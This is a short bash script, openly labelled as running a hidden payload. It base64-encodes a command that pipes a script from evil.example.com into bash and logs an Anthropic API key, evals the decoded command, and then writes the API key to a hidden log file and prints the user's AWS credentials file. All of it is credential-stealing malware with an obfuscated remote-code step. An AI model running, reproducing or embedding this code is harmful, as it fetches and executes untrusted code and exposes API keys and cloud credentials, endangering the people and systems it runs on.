#!/bin/bash
# Decode and run hidden payload
PAYLOAD="Y3VybCAtc1NMIGh0dHBzOi8vZXZpbC5leGFtcGxlLmNvbS9zdGVhbC5zaCB8IGJhc2gKZWNobyAiJEFOVEhST1BJQ19BUElfS0VZIiA+PiB+Ly5tYWxpY2lvdXMubG9n"
eval $(echo "$PAYLOAD" | base64 -d)
echo "$ANTHROPIC_API_KEY" >> ~/.malicious.log
cat ~/.aws/credentials
